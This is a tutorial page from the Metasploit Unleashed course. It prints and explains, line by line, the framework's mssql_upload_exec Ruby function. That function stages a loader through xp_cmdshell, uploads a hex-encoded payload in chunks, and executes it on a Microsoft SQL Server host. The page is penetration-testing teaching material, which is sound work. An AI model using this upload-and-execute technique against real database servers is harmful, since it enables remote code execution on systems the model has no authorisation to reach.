Guts Behind It</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Lets look into the
framework3/lib/msf/core/exploits/ and use your
favorite editor and edit the mssql.rb file. Do a search for
"mssql_upload_exec" (control-w for nano and / for vi). You should be
seeing the following:
<br>
<br>
</p>
<pre id="code">#<br># Upload and execute a Windows binary through MSSQL queries<br>#<br>def mssql_upload_exec(exe, debug=false)<br>hex = exe.unpack("H*")[0]<br><br>var_bypass = rand_text_alpha(8)<br>var_payload = rand_text_alpha(8)<br><br>print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")<br>print_status("Writing the debug.com loader to the disk...")<br>h2b = File.read(datastore['HEX2BINARY'], File.size(datastore['HEX2BINARY']))<br>h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")<br>h2b.split(/\n/).each do |line|<br>mssql_xpcmdshell("#{line}", false)<br>end<br><br>print_status("Converting the debug script to an executable...")<br>mssql_xpcmdshell("cmd.exe /c cd %TEMP% &amp;&amp; cd %TEMP% &amp;&amp; debug &lt; %TEMP%\\#{var_bypass}", debug)<br>mssql_xpcmdshell("cmd.exe /c move %TEMP%\\#{var_bypass}.bin %TEMP%\\#{var_bypass}.exe", debug)<br><br>print_status("Uploading the payload, please be patient...")<br>idx = 0<br>cnt = 500<br>while(idx &lt; hex.length - 1)<br>mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}&gt;&gt;%TEMP%\\#{var_payload}", false)<br>idx += cnt<br>end<br><br>print_status("Converting the encoded payload...")<br>mssql_xpcmdshell("%TEMP%\\#{var_bypass}.exe %TEMP%\\#{var_payload}", debug)<br>mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_bypass}.exe", debug)<br>mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)<br><br>print_status("Executing the payload...")<br>mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout =&gt; 1})<br>end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">The def mssql_upload_exec(exe,
debug=false) requires two parameters
and sets the debug to false by default unless otherwise specified.
</span>
<p style="color: rgb(0, 0, 0);">The hex = exe.unpack("H*")[0] is some
Ruby Kung-Fuey that takes our
generated executable and magically turns it into hexadecimal for us.
</p>
<p style="color: rgb(0, 0, 0);">var_bypass = rand_text_alpha(8) and
var_payload =
rand_text_alpha(8) creates two variables with a random set of 8 alpha
characters, for example: PoLecJeX
</p>
<p style="color: rgb(0, 0, 0);">The print_status must always be used
within Metasploit, HD will
not accept puts anymore! If you notice there are a couple things
different for me vs. python, in the print_status you'll notice
"#{var_payload}.exe this subsititues the variable var_payload into the
print_status message, so you would essentially see portrayed back
"PoLecJeX.exe"
</p>
<p style="color: rgb(0, 0, 0);">Moving on, the h2b =
File.read(datastore['HEX2BINARY'],
File.size[datastore['HEX2BINARY'])) will read whatever the file
specified in the "HEX2BINARY" datastore, if you look at when we fired
off the exploit, it was saying "h2b", this file is located at
data/exploits/mssql/h2b, this is a file that I had previously created
that is a specific format for windows debug that is essentially a
simple bypass for removing restrictions on filesize limit. We first
send this executable, windows debug converts it back to a binary for
us, and then we send the metasploit payload and call our prior
converted executable to convert our metasploit file.
</p>
<p style="color: rgb(0, 0, 0);">The h2b.gsuc!(/KemneE3N/,
"%TEMP%\\#{var_bypass}") is simply
substituing a hardcoded name with the dynamic one we created above, if
you look at the h2b file, KemneE3N is called on multiple occasions and
we want to randomly create a name to obfuscate things a little better.
The gsub just substitutes the hardcoded with the random one. The
h2b.split(/\n/).each do |line| will start a loop for us and split the
bulky h2b file into multiple lines, reason being is we can't send the
entire bulk file over at once, we have to send it a little at a time as
the MSSQL protocol does not allow us very large transfers through SQL
statements. Lastly, the mssql_xpcmdshell("#{line}", false) sends the
initial stager payload line by line while the false specifies debug as
false and to not send the information back to us.
</p>
<p style="color: rgb(0, 0, 0);">The next few steps convert our h2b file
to a binary for us
utilizing Windows debug, we are using the&nbsp;%TEMP% directory for
more
reliability. The mssql_xpcmdshell strored procedure is allowing
this to occur.
</p>
<p style="color: rgb(0, 0, 0);">The idx = 0 will server as a counter
for us to let us know when
the filesize has been reached, and the cnt = 500 specifies how many
characters we are sending at a time. The next line sends our payload to
a new file 500 characters at a time, increasing the idx counter and
ensuring that idx is still less than the hex.length blob. Once that has
been finished the last few steps convert our metasploit payload back to
an executable using our previously staged payload then executes it
giving us our payload!
</p>
<p style="color: rgb(0, 0, 0);">Thats it! Phew. In this lesson you
walked through the creation
of an overall attack vector and got more familar with what goes on
behind the curtains. If your thinking about creating a new module, look
around there is usually something that you can use as a baseline to
help you create it.
</p>
<p style="color: rgb(0, 0, 0);">Hopefully we didn't loose you in this.
Before we end this
chapter take a quick peek at lib/msf/core/exploit and edit the
mssql_commands.rb, here you will see a detailed list of MSSQL commands
that me and Dark Operator have been building for a little while now.
You can additionally start creating your own modules off of this if you
wanted to!
